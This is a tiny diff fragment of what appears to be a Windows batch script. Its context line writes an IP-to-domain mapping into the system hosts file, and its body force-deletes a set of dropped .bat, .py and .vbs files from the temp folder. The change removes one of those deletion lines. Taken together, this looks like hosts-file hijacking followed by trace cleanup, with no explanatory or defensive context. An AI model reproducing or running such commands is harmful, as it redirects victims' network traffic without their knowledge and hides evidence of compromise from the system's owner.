@@ -41,7 +41,6 @@ echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 cd %temp%
 del /f /q "s.bat"
 del /f /q "a.py"
-del /f /q "asd.bat"
 del /f /q "ddd.vbs"
 del /f /q "expe2.bat"
 del /f /q "expe2.vbs"
